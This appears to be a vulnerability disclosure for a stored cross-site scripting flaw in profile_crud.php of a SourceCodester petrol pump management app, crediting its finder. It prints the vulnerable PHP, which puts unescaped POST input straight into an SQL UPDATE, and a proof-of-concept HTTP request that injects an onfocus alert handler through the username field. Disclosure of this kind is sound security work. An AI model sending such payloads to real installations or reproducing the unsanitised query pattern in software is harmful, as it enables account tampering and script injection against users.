# SOURCECODESTER / Petrol pump management software - profile_crud.php Unauthenticated STORED XSS.md

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/app/profile_crud.php

## Code
```php
//echo "UPDATE `login` SET `username`='".$_POST['username']."',`email`='".$_POST['email']."',`mobileno`='".$_POST['mobileno']."',`image`='".$img."' WHERE id='".$_SESSION['id']."' ";exit;
	$stmt = $conn->prepare("UPDATE `login` SET `username`='" . $_POST['username'] . "',`email`='" . $_POST['email'] . "',`mobileno`='" . $_POST['mobileno'] . "',`image`='" . $img . "' WHERE id='" . $_SESSION['id'] . "' ");
	$stmt->execute();



	header("location:../dashboard.php");
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/app/profile_crud.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

update=&username="+onfocus%3dalert(\'nochizplz\')>'+%23
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/3ed26dd8-f6d4-4029-8447-be5e7d81eb92)
